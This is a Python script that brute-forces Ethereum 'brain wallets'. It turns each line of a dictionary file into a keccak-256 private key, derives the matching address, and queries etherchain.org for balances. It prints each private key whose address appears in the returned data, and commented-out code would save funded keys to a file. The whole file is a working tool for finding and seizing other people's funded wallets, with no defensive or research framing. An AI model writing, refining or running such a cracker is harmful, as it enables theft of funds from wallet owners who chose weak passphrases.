import threading
import os
import time
import codecs
import requests
import json
from ecdsa import SigningKey, SECP256k1
import sha3
import traceback

def getAddress(phrases):
    keyList = []
    addrList = []
    addrStr = ""
    try:
        for phrase in phrases:
            key = sha3.keccak_256(phrase.encode("utf-8")).hexdigest()
            priv = codecs.decode(key, 'hex_codec')
            pub = SigningKey.from_string(priv, curve=SECP256k1).get_verifying_key().to_string()
            addr = "0x" + sha3.keccak_256(pub).hexdigest()[24:]
            keyList.append(key)
            addrList.append(addr)
            if len(addrStr): addrStr = addrStr + ","
            addrStr = addrStr + addr
    except:
        pass
    return [keyList, addrList, addrStr]

def getBalances(addrStr):
    balances = ""
    try:
        r = requests.get(url='https://etherchain.org/api/account/multiple/%s' % addrStr, timeout=5)
        balances = r.text
    except:
        return
    try:
        balances = json.loads(balances)
        if balances['status'] != 1: raise Exception("API Busy")
        balances = balances['data']
    except:
        print (balances)
    return balances

getCount = 0
fp_dict = open("dict.txt", "r")
#fp_found = open("found.txt", "w+")
#fp_fund = open("fund.txt", "w+")

def getWallet():
    global getCount
    while True:
        phrases = []
        try:
            for i in range(50):
                readStr = fp_dict.readline().replace("\r","").replace("\n","")
                if not len(readStr): break
                phrases.append(readStr)
        except:
            pass
        if len(phrases) <= 0: break
        addressRet = getAddress(phrases)
        getCount = getCount + len(phrases)

        try:
            balancesRet = getBalances(addressRet[2])
            for balance in balancesRet:
                key = ""
                for i in range(0, len(addressRet[1])):
                    if balance['address'] == addressRet[1][i]:
                        key = addressRet[0][i]
                        break
                if key == "": continue
                #fp_found.write(str(balance['balance']) + " " + key + " " + balance['address'] + "\n")
                #if balance['balance'] > 0:
                    #fp_fund.write(str(balance['balance']) + " " + key + " " + balance['address'] + "\n")
                print (balance['balance'], key, balance['address'])
            #fp_found.flush()
            #fp_fund.flush()
        except:
            traceback.print_exc()
            break
        clearScreen()
        print (getCount)
        break

def clearScreen():
    os.system('clear')

def main():
    threads = []
    for i in range(1):
        threads.append(threading.Thread(target=getWallet,args=()))
    for t in threads:
        time.sleep(1.0)
        t.start()
    for t in threads:
        t.join()

if __name__ == '__main__':
    main()
